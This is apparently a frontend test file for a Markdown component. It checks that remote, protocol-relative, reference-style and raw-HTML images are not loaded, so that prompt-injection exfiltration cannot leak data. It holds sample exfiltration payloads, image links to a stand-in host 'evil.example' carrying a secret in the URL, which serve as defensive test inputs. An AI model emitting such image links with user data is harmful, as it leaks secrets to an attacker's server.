// @vitest-environment jsdom
import { screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { renderWithProviders } from "../../test/render";
import { Markdown } from "./Markdown";

const EXFIL = "https://evil.example/?q=secret";

describe("Markdown images", () => {
  it("never loads a remote image (prompt-injection exfiltration)", () => {
    const { container } = renderWithProviders(<Markdown text={`Look ![chart](${EXFIL}) here`} />);
    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByRole("link", { name: /chart/ });
    expect(link.getAttribute("href")).toBe(EXFIL);
    expect(link.getAttribute("rel")).toContain("noreferrer");
  });

  it("does not load protocol-relative, reference-style or http images either", () => {
    const text = [
      "![a](//evil.example/x.png)",
      "![b](http://evil.example/x.png)",
      "![c][ref]",
      "",
      `[ref]: ${EXFIL}`,
    ].join("\n");
    const { container } = renderWithProviders(<Markdown text={text} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("<img");
  });

  it("does not render raw HTML images", () => {
    const { container } = renderWithProviders(<Markdown text={`<img src="${EXFIL}">`} />);
    expect(container.querySelector("img")).toBeNull();
  });

  it("shows the URL when the image has no alt text", () => {
    renderWithProviders(<Markdown text={`![](${EXFIL})`} />);
    expect(screen.getByRole("link").textContent).toContain("evil.example");
  });

  it("keeps an inline data: raster image", () => {
    const src = "data:image/png;base64,iVBORw0KGgo=";
    const { container } = renderWithProviders(<Markdown text={`![dot](${src})`} />);
    expect(container.querySelector("img")?.getAttribute("src")).toBe(src);
  });

  it("does not inline an SVG data image", () => {
    const { container } = renderWithProviders(<Markdown text={"![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)"} />);
    expect(container.querySelector("img")).toBeNull();
  });
});
